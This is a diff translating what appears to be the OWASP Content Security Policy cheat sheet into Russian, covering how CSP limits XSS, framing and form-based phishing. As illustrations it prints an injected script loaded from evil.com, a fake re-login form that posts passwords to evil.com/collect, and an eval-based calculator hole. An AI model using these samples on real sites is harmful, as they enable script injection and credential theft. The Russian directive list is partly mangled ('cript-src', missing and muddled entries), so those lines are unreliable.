@@ -1,159 +1,159 @@
-# Content Security Policy Cheat Sheet
+# Шпаргалка по Content Security Policy
 
-## Introduction
+## Введение
 
-This article brings forth a way to integrate the __defense in depth__ concept to the client-side of web applications. By injecting the Content-Security-Policy (CSP) headers from the server, the browser is aware and capable of protecting the user from dynamic calls that will load content into the page currently being visited.
+Эта статья представляет способ интеграции концепции **глубокой защиты** на стороне клиента веб-приложений. Путем внедрения заголовков Content-Security-Policy (CSP) с сервера браузер становится осведомленным и способен защищать пользователя от динамических вызовов, загружающих содержимое на страницу, которая в данный момент посещается.
 
-## Context
+## Контекст
 
-The increase in XSS (Cross-Site Scripting), clickjacking, and cross-site leak vulnerabilities demands a more __defense in depth__ security approach.
+Рост числа уязвимостей XSS (межсайтового скриптинга), кликджекинга и утечек данных между сайтами требует более подхода безопасности с концепцией **глубокой защиты**.
 
-### Defense against XSS
+### Защита от XSS
 
-CSP defends against XSS attacks in the following ways:
+CSP защищает от XSS-атак следующими способами:
 
-#### 1. Restricting Inline Scripts
+#### 1. Ограничение встроенных скриптов
 
-By preventing the page from executing inline scripts, attacks like injecting
+Запрещая странице выполнять встроенные скрипты, такие атаки, как инъекции
 
 ```html
 <script>document.body.innerHTML='defaced'</script>
 ```
 
- will not work.
+ не сработают.
 
-#### 2. Restricting Remote Scripts
+#### 2. Ограничение удаленных скриптов
 
-By preventing the page from loading scripts from arbitrary servers, attacks like injecting
+Запрещая странице загружать скрипты с произвольных серверов, такие атаки, как внедрение
 
 ```html
 <script src="https://evil.com/hacked.js"></script>
 ```
 
-will not work.
+не сработают.
 
-#### 3. Restricting Unsafe JavaScript
+#### 3. Ограничение небезопасного JavaScript
 
-By preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like the this:
+Запрещая странице выполнять функции преобразования текста в JavaScript, такие как `eval`, сайт будет защищен от подобных уязвимостей:
 
 ```js
-// A Simple Calculator
+// Простой калькулятор
 var op1 = getUrlParameter("op1");
 var op2 = getUrlParameter("op2");
 var sum = eval(`${op1} + ${op2}`);
-console.log(`The sum is: ${sum}`);
+console.log(`Сумма: ${sum}`);
 ```
 
-#### 4. Restricting Form submissions
+#### 4. Ограничение отправки форм
 
-By restricting where HTML forms on your website can submit their data, injecting phishing forms won't work either.
+Ограничивая, куда могут отправлять данные HTML-формы на вашем сайте, внедрение фишинговых форм также не сработает.
 
 ```html
 <form method="POST" action="https://evil.com/collect">
-<h3>Session expired! Please login again.</h3>
-<label>Username</label>
+<h3>Сессия истекла! Пожалуйста, войдите снова.</h3>
+<label>Имя пользователя</label>
 <input type="text" name="username"/>
 
-<label>Password</label>
+<label>Пароль</label>
 <input type="password" name="pass"/>
 
 <input type="Submit" value="Login"/>
 </form>
 ```
 
-#### 5. Restricting Objects
+#### 5. Ограничение объектов
 
-And by restricting the HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) tag, it also won't be possible for an attacker to inject malicious flash/Java/other legacy executables on the page.
+Кроме того, запрет тега HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) предотвратит возможность внедрения злоумышленниками вредоносных программ на Flash, Java или других устаревших исполняемых файлов на страницу.
 
-### Defense against framing attacks
+### Защита от атак на фреймы
 
-Attacks like clickjacking and some variants of browser side-channel attacks (xs-leaks) require a malicious website to load the target website in a frame.
+Атаки, такие как кликджекинг и некоторые варианты атак стороннего канала браузера (xs-leaks), требуют, чтобы вредоносный веб-сайт загрузил целевой сайт во фрейме.
 
-Historically the `X-Frame-Options` header has been used for this, but it has been obsoleted by the `frame-ancestors` CSP directive.
+Исторически заголовок `X-Frame-Options` использовался для этого, но он был заменен директивой CSP `frame-ancestors`.
 
-### Defense in Depth
+### Защита в глубину
 
-A strong CSP provides an effective **second layer** of protection against various types of vulnerabilities, especially XSS. Although CSP doesn't prevent web applications from *containing* vulnerabilities, it can make those vulnerabilities significantly more difficult for an attacker to exploit.
+Сильная CSP обеспечивает эффективный **второй уровень** защиты от различных видов уязвимостей, особенно XSS. Хотя CSP не предотвращает наличие уязвимостей в веб-приложениях, она может значительно усложнить их эксплуатацию для злоумышленника.
 
-Even on a fully static website, which does not accept any user input, a CSP can be used to enforce the use of [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity). This can help prevent malicious code from being loaded on the website if one of the third-party sites hosting JavaScript files (such as analytics scripts) is compromised.
+Даже на полностью статическом веб-сайте, который не принимает никаких пользовательских данных, CSP может использоваться для обеспечения использования [интеграции подресурсов (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity). Это может помочь предотвратить загрузку вредоносного кода на сайт, если один из сторонних сайтов, размещающих файлы JavaScript (например, скрипты аналитики), будет скомпрометирован.
 
-With all that being said, CSP **should not** be relied upon as the only defensive mechanism against XSS. You must still follow good development practices such as the ones described in [Cross-Site Scripting Prevention Cheat Sheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md), and then deploy CSP on top of that as a bonus security layer.
+При всем при этом CSP **не должна** быть единственным механизмом защиты от XSS. Вы должны по-прежнему соблюдать хорошие практики разработки, такие как описанные в [шпаргалке по предотвращению XSS](Cross_Site_Scripting_Prevention_Cheat_Sheet.md), а затем внедрять CSP в качестве дополнительного уровня защиты.
 
-## Policy Delivery
+## Доставка политики
 
-You can deliver a Content Security Policy to your website in three ways.
+Вы можете доставить Content Security Policy на ваш веб-сайт тремя способами.
 
-### 1. Content-Security-Policy Header
+### 1. Заголовок Content-Security-Policy
 
-Send a Content-Security-Policy HTTP response header from your web server.
+Отправьте HTTP-заголовок ответа Content-Security-Policy с вашего веб-сервера.
 
 ```text
 Content-Security-Policy: ...
 ```
 
-Using a header is the preferred way and supports the full CSP feature set. Send it in all HTTP responses, not just the index page.
+Использование заголовка является предпочтительным способом и поддерживает весь набор функций CSP. Отправляйте его во всех HTTP-ответах, а не только на главной странице.
 
-This is a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+
+Это стандартный заголовок спецификации W3C, поддерживаемый Firefox 23+, Chrome 25+ и Opera 19+.
 
-### 2. Content-Security-Policy-Report-Only Header
+### 2. Заголовок Content-Security-Policy-Report-Only
 
-Using the `Content-Security-Policy-Report-Only`, you can deliver a CSP that doesn't get enforced.
+С использованием `Content-Security-Policy-Report-Only`, вы можете доставить CSP, которая не будет применяться.
 
 ```text
 Content-Security-Policy-Report-Only: ...
 ```
 
-Still, violation reports are printed to the console and delivered to a violation endpoint if the `report-to` and `report-uri` directives are used.
+Тем не менее, отчеты о нарушениях будут выводиться в консоль и отправляться на конечную точку отчета, если используются директивы `report-to` и `report-uri`.
 
-This is also a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking ("fail open") and a report is sent to the URL designated by the `report-uri` (or newer `report-to`) directive. This is often used as a precursor to utilizing CSP in blocking mode ("fail closed")
+Это также стандартный заголовок спецификации W3C. Поддерживается Firefox 23+, Chrome 25+ и Opera 19+, где политика является не блокирующей ("открытый отказ") и отчет отправляется на URL, указанный в директиве `report-uri` (или новой `report-to`). Часто используется как предшественник к использованию CSP в режиме блокировки ("закрытый отказ").
 
-Browsers fully support the ability of a site to use both `Content-Security-Policy` and `Content-Security-Policy-Report-Only` together, without any issues. This pattern can be used for example to run a strict `Report-Only` policy (to get many violation reports), while having a looser enforced policy (to avoid breaking legitimate site functionality).
+Браузеры полностью поддерживают возможность использования сайтом как `Content-Security-Policy`, так и `Content-Security-Policy-Report-Only` вместе, без каких-либо проблем. Этот шаблон можно использовать, например, для запуска строгой политики `Report-Only` (для получения множества отчетов о нарушениях), в то время как применяется более слабая политика (чтобы избежать нарушения функциональности сайта).
 
-### 3. Content-Security-Policy Meta Tag
+### 3. Мета-тег Content-Security-Policy
 
-Sometimes you cannot use the Content-Security-Policy header if you are, e.g., Deploying your HTML files in a CDN where the headers are out of your control.
+Иногда вы не можете использовать заголовок Content-Security-Policy, если, например, вы размещаете ваши HTML-файлы в CDN, где заголовки находятся вне вашего контроля.
 
-In this case, you can still use CSP by specifying a `http-equiv` meta tag in the HTML markup, like so:
+В этом случае вы все равно можете использовать CSP, указав мета-тег `http-equiv` в разметке HTML, следующим образом:
 
 ```html
 <meta http-equiv="Content-Security-Policy" content="...">
 ```
 
-Almost everything is still supported, including full XSS defenses. However, you will not be able to use [framing protections](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [sandboxing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), or a [CSP violation logging endpoint](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).
+Поддерживаются практически все функции, включая полную защиту от XSS. Однако вы не сможете использовать [защиту фреймов](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [песочницу](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), или [конечную точку логирования нарушений CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).
 
-### WARNING
+### ПРЕДУПРЕЖДЕНИЕ
 
-**DO NOT** use `X-Content-Security-Policy` or `X-WebKit-CSP`. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.
+**НЕ** используйте `X-Content-Security-Policy` или `X-WebKit-CSP`. Их реализации устарели (с Firefox 23, Chrome 25), ограничены, непоследовательны и чрезвычайно забагованные.
 
-## CSP Types (granular/allowlist based or strict)
+## Типы CSP (гранулярные/разрешающие или строгие)
 
-The original mechanism for building a CSP involved creating allow-lists which would define the content and sources that were permitted in the context of the HTML page.
+Изначально механизм создания CSP предполагал создание списков разрешений, которые определяли бы содержимое и источники, разрешенные в контексте HTML-страницы.
 
-However, current leading practice is to create a "Strict" CSP which is much easier to deploy and more secure as it is less likely to be bypassed.
+Однако текущая передовая практика состоит в создании "Строгой" CSP, которая намного проще в развертывании и безопаснее, так как ее сложнее обойти.
 
-## Strict CSP
+## Строгая CSP
 
-A strict CSP can be created by using a limited number of the granular [Fetch Directives listed below](#fetch-directives) listed below along with one of two mechanisms:
+Строгая CSP может быть создана с использованием ограниченного числа гранулярных [директив Fetch, перечисленных ниже](#fetch-directives), наряду с одним из двух механизмов:
 
-- Nonce based
-- Hash based
+- На основе одноразовых ключей (Nonce)
+- На основе хешей
 
-The `strict-dynamic` directive can optionally also be used to make it easier to implement a Strict CSP.
+Директива `strict-dynamic` также может использоваться для упрощения внедрения строгой CSP.
 
-The following sections will provide some basic guidance to these mechanisms but it is strongly recommended to follow Google's detailed and methodological instructions for creating a Strict CSP:
+В следующих разделах будут представлены некоторые основные рекомендации по этим механизмам, но настоятельно рекомендуется следовать подробным и методологическим инструкциям Google по созданию строгой CSP:
 
-**[Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)](https://web.dev/strict-csp/)**
+**[Смягчение межсайтового скриптинга (XSS) с помощью строгой политики безопасности контента (CSP)](https://web.dev/strict-csp/)**
 
-### Nonce based
+### Основанные на одноразовых ключах (Nonce)
 
-Nonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:
+Nonce — это уникальные одноразовые случайные значения, которые вы генерируете для каждого HTTP-ответа и добавляете в заголовок Content-Security-Policy следующим образом:
 
 ```js
 const nonce = uuid.v4();
 scriptSrc += ` 'nonce-${nonce}'`;
 ```
 
-You would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:
+Затем вы передаете этот одноразовый ключ в представление (использование одноразовых ключей требует не статичного HTML) и рендерите теги скриптов, которые выглядят примерно так:
 
 ```html
 <script nonce="<%= nonce %>">
@@ -161,77 +161,75 @@ You would then pass this nonce to your view (using nonces requires a non-static 
 </script>
 ```
 
-#### Warning
+#### Предупреждение
 
-**Don't** create a middleware that replaces all script tags with "script nonce=..." because attacker-injected scripts will then get the nonces as well. You need an actual HTML templating engine to use nonces.
+**Не** создавайте middleware, который заменяет все теги скриптов на "script nonce=...", потому что в этом случае злоумышленники также получат одноразовые ключи. Вам необходим настоящий механизм шаблонизации HTML для использования одноразовых ключей.
 
-### Hashes
+### Хеши
 
-When inline scripts are required, the `script-src 'hash_algo-hash'` is another option for allowing only specific scripts to execute.
+Когда требуется использование встроенных скриптов, `script-src 'hash_algo-hash'` является еще одним вариантом, позволяющим выполнить только определенные скрипты.
 
 ```text
 Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
 ```
 
-To get the hash, look at Google Chrome developer tools for violations like this:
+Чтобы получить хеш, посмотрите в инструментах разработчика Google Chrome нарушения, такие как это:
 
-> ❌ Refused to execute inline script because it violates the following Content Security Policy directive: "..." Either the 'unsafe-inline' keyword, a hash (**'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='**), or a nonce...
+> ❌ Выполнение встроенного скрипта было отказано, так как это нарушает следующую директиву Content Security Policy: "..." Используйте либо ключевое слово 'unsafe-inline', либо хеш (**'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='**), либо одноразовый ключ (nonce)...
 
-You can also use this [hash generator](https://report-uri.com/home/hash). This is a great [example](https://csp.withgoogle.com/docs/faq.html#static-content) of using hashes.
+Вы также можете использовать этот [генератор хешей](https://report-uri.com/home/hash). Это отличный [пример](https://csp.withgoogle.com/docs/faq.html#static-content) использования хешей.
 
-#### Note
+#### Примечание
 
-Using hashes can be a risky approach. If you change *anything* inside the script tag (even whitespace) by, e.g., formatting your code, the hash will be different, and the script won't render.
+Использование хешей может быть рискованным. Если вы измените что-либо внутри тега скрипта (даже пробелы), например, отформатируете код, хеш будет другим, и скрипт не выполнится.
 
 ### strict-dynamic
 
-The `strict-dynamic` directive can be used as part of a Strict CSP in combination with either hashes or nonces.
+Директива `strict-dynamic` может использоваться как часть строгой CSP в сочетании с хешами или одноразовыми ключами (nonce).
 
-If a script block which has either the correct hash or nonce is creating additional DOM elements and executing JS inside of them, `strict-dynamic` tells the browser to trust those elements as well without having to explicitly add nonces or hashes for each one.
+Если блок скрипта, который содержит либо правильный хеш, либо одноразовый ключ, создает дополнительные элементы DOM и выполняет JS внутри них, `strict-dynamic` указывает браузеру доверять этим элементам, не требуя явного добавления одноразовых ключей или хешей для каждого из них.
 
-Note that whilst `strict-dynamic` is a CSP level 3 feature, CSP level 3 is very widely supported in common, modern browsers.
+Обратите внимание, что `strict-dynamic` является функцией CSP уровня 3, CSP уровня 3 поддерживается большинством современных браузеров.
 
-For more details, check out [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).
+Для получения дополнительной информации ознакомьтесь с [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).
 
-## Detailed CSP Directives
+## Подробные директивы CSP
 
-Multiple types of directives exist that allow the developer to control the flow of the policies granularly. Note that creating a non-Strict policy that is too granular or permissive is likely to lead to bypasses and a loss of protection.
+Существуют различные типы директив, позволяющих разработчику контролировать политику на уровне гранул. Имейте в виду, что создание нестрогой политики, которая слишком гранулирована или разрешает слишком много, может привести к обходу политики и потере защиты.
 
-### Fetch Directives
+### Директивы выборки (Fetch)
 
-Fetch directives tell the browser the locations to trust and load resources from.
+Директивы Fetch указывают браузеру, каким местам доверять и откуда загружать ресурсы.
 
-Most fetch directives have a certain [fallback list specified in w3](https://www.w3.org/TR/CSP3/#directive-fallback-list). This list allows for granular control of the source of scripts, images, files, etc.
+Большинство директив fetch имеют определенный [резервный список, определённый в W3](https://www.w3.org/TR/CSP3/#directive-fallback-list). Этот список позволяет детально контролировать источник скриптов, изображений, файлов и т. д.
 
-- `child-src` allows the developer to control nested browsing contexts and worker execution contexts.
-- `connect-src` provides control over fetch requests, XHR, eventsource, beacon and websockets connections.
-- `font-src` specifies which URLs to load fonts from.
-- `img-src` specifies the URLs that images can be loaded from.
-- `manifest-src` specifies the URLs that application manifests may be loaded from.
-- `media-src` specifies the URLs from which video, audio and text track resources can be loaded from.
-- `prefetch-src` specifies the URLs from which resources can be prefetched from.
-- `object-src` specifies the URLs from which plugins can be loaded from.
-- `script-src` specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives.
-    - `script-src-elem` controls the location from which execution of script requests and blocks can occur.
-    - `script-src-attr` controls the execution of event handlers.
-- `style-src` controls from where styles get applied to a document. This includes `<link>` elements, `@import` rules, and requests originating from a `Link` HTTP response header field.
-    - `style-src-elem` controls styles except for inline attributes.
-    - `style-src-attr` controls styles attributes.
-- `default-src` is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of `default-src`.
+- `child-src` позволяет разработчику управлять вложенными контекстами просмотра и рабочими контекстами выполнения.
+- `connect-src` обеспечивает контроль над fetch-запросами, XHR, eventsource, beacon и websockets-соединениями.
+- `font-src` указывает, с каких URL загружать шрифты.
+- `img-src` определяет URL, с которых можно загружать изображения.
+- `manifest-src` определяет URL, с которых можно загружать манифесты приложений.
+- `media-src` определяет URL-адреса, с которых могут загружаться видео-, аудио- и текстовые дорожки.
+- `prefetch-src` определяет URL-адреса, с которых можно осуществлять предварительную выборку ресурсов.
+- `object-src` определяет URL-адреса, с которых можно загружать плагины.
+- `cript-src` указывает местоположение, с которого может быть выполнен скрипт. Является запасной директивой для других скрипт-подобных директив.
+    - `script-src-elem` управляет местом, откуда будут выполняться запросы и блоки скриптов.
+    - `style-src-attr` управляет аттрибутами стилей.
+- `default-src` - резервная директива для других Fetch директив.
+ Определённые директивы не имеют наследования, в то время как неопределённые директивы будут определены как `default-src`.
 
-### Document Directives
+### Директивы документа
 
-Document directives instruct the browser about the properties of the document to which the policies will apply to.
+Директивы документа используются для указания браузеру свойств документа, к которым будут применяться политики.
 
-- `base-uri` specifies the possible URLs that the `<base>` element can use.
-- `plugin-types` limits the types of resources that can be loaded into the document (*e.g.* application/pdf). 3 rules apply to the affected elements, `<embed>` and `<object>`:
-    - The element needs to explicitly declare its type.
-    - The element's type needs to match the declared type.
-    - The element's resource needs to match the declared type.
-- `sandbox` restricts a page's actions such as submitting forms.
-    - Only applies when used with the request header `Content-Security-Policy`.
-    - Not specifying a value for the directive activates all of the sandbox restrictions. `Content-Security-Policy: sandbox;`
-    - [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)
+- `base-uri` определяет возможные URL-адреса, которые могут использоваться элементом `<base>`.
+- `plugin-types` ограничивает типы ресурсов, которые могут загружаться в документе (*например*, application/pdf). 3 правила применяются к подверженным элементам, `<embed>` и `<object>`:
+    - Элемент должен явно объявить свой тип.
+    - Тип элемента должен соответствовать объявленному типу.
+    - Ресурс элемента должен соответствовать объявленному типу.
+- `sandbox` ограничивает действия на странице, такие как отправка форм.
+    - Применяется только при использовании с заголовком запроса `Content-Security-Policy`.
+    - Если не указывать значение директивы, то активируются все ограничения песочницы. `Content-Security-Policy: sandbox;`
+    - [Синтаксис песочницы](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)
 
 ### Navigation Directives
 
